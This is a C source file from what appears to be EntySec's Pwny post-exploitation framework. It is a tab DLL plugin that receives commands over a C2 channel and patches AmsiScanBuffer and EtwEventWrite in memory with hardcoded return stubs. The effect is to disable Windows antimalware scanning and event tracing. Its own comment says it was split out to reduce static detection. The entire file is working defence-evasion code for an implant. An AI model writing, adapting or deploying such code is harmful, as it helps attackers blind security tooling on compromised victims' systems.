/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Evasion tab plugin — AMSI/ETW patching.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <pwny/c2.h>
#include <pwny/log.h>

#define EVASION_BASE 28

#define EVASION_PATCH_AMSI \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       EVASION_BASE, \
                       API_CALL)

#define EVASION_PATCH_ETW \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       EVASION_BASE, \
                       API_CALL + 1)

#define EVASION_PATCH_ALL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       EVASION_BASE, \
                       API_CALL + 2)

#ifdef _WIN64
#define AMSI_PATCH_SIZE  6
static unsigned char amsi_patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

#define ETW_PATCH_SIZE   4
static unsigned char etw_patch[]  = { 0x48, 0x33, 0xC0, 0xC3 };
#else
#define AMSI_PATCH_SIZE  8
static unsigned char amsi_patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

#define ETW_PATCH_SIZE   6
static unsigned char etw_patch[]  = { 0x33, 0xC0, 0xC2, 0x14, 0x00, 0x90 };
#endif

static int evasion_patch_function(const char *module, const char *func,
                                  unsigned char *patch, size_t patch_size)
{
    HMODULE hMod;
    FARPROC pFunc;
    DWORD dwOldProt;

    hMod = GetModuleHandleA(module);
    if (hMod == NULL)
    {
        log_debug("* evasion: module %s not loaded\n", module);
        return -1;
    }

    pFunc = GetProcAddress(hMod, func);
    if (pFunc == NULL)
    {
        log_debug("* evasion: function %s not found in %s\n", func, module);
        return -1;
    }

    if (!VirtualProtect((LPVOID)pFunc, patch_size, PAGE_EXECUTE_READWRITE, &dwOldProt))
    {
        log_debug("* evasion: VirtualProtect failed (%lu)\n", GetLastError());
        return -1;
    }

    memcpy((LPVOID)pFunc, patch, patch_size);

    VirtualProtect((LPVOID)pFunc, patch_size, dwOldProt, &dwOldProt);
    FlushInstructionCache(GetCurrentProcess(), (LPCVOID)pFunc, patch_size);

    log_debug("* evasion: patched %s!%s (%zu bytes)\n", module, func, patch_size);
    return 0;
}

static tlv_pkt_t *evasion_amsi(c2_t *c2)
{
    if (evasion_patch_function("amsi.dll", "AmsiScanBuffer",
                               amsi_patch, AMSI_PATCH_SIZE) != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *evasion_etw(c2_t *c2)
{
    if (evasion_patch_function("ntdll.dll", "EtwEventWrite",
                               etw_patch, ETW_PATCH_SIZE) != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *evasion_all(c2_t *c2)
{
    int amsi_ok;
    int etw_ok;

    LoadLibraryA("amsi.dll");

    amsi_ok = evasion_patch_function("amsi.dll", "AmsiScanBuffer",
                                     amsi_patch, AMSI_PATCH_SIZE);
    etw_ok = evasion_patch_function("ntdll.dll", "EtwEventWrite",
                                    etw_patch, ETW_PATCH_SIZE);

    if (amsi_ok != 0 && etw_ok != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, EVASION_PATCH_AMSI, (api_t)evasion_amsi);
    api_call_register(api_calls, EVASION_PATCH_ETW, (api_t)evasion_etw);
    api_call_register(api_calls, EVASION_PATCH_ALL, (api_t)evasion_all);
}

#endif
